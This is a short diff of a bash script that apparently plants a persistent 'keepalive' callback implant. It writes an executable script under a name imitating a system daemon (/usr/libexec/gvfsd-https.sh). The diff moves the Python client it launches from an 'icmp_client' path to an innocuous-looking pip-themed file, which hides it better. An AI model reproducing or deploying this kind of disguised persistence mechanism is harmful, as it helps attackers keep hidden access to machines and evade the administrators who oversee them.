@@ -6,7 +6,7 @@ CALLBACK_SCRIPT="/usr/libexec/gvfsd-https.sh"
 # Create a very obvious keepalive script
 cat > "$CALLBACK_SCRIPT" << 'EOF'
 #!/bin/bash
-python3 /etc/gss/mech.d/icmp_client.py
+python3 /etc/python3.10/pip_connectivity.py
 EOF
 
 chmod +x "$CALLBACK_SCRIPT"
